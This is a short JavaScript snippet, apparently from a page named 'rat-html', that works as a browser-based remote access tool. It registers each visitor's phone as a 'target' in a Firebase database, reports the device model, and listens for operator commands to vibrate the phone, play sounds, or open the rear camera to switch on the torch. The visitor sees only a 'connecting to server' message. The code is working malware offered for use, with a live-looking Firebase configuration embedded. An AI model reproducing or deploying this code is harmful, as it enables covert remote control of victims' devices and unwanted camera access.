<script>
    // FIREBASE CONFIG LU SUDAH TERPASANG TOTAL
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120",
      measurementId: "G-XMHT2S731L"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const params = new URLSearchParams(window.location.search);
    const myKey = params.get('key') || "UNKNOWN";
    const tid = "TGT-" + Math.floor(Math.random() * 9999);

    function gas() {
        if(navigator.vibrate) navigator.vibrate(100);
        new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play().catch(()=>{});

        document.getElementById('ui').innerHTML = "⏳ Menghubungkan ke server...";
        
        db.ref('mario/targets/' + tid).set({
            model: getModel(),
            belongsTo: myKey,
            status: "online"
        });

        db.ref('mario/commands/' + tid).on('value', (s) => {
            const c = s.val(); if(!c) return;
            if(c.action === "vibrate") navigator.vibrate([500, 200, 500]);
            if(c.action === "play_audio") new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
            if(c.action === "torch_on") {
                navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}})
                .then(st => { st.getVideoTracks()[0].applyConstraints({advanced: [{torch: true}]}); });
            }
            if(c.action === "torch_off") location.reload();
        });
    }

    function getModel() {
        const ua = navigator.userAgent;
        const match = ua.match(/Android\s+([^\s;]+|[^;]+);\s+([^;)]+)/);
        return match ? match[2].trim() : "Android Device";
    }
</script>
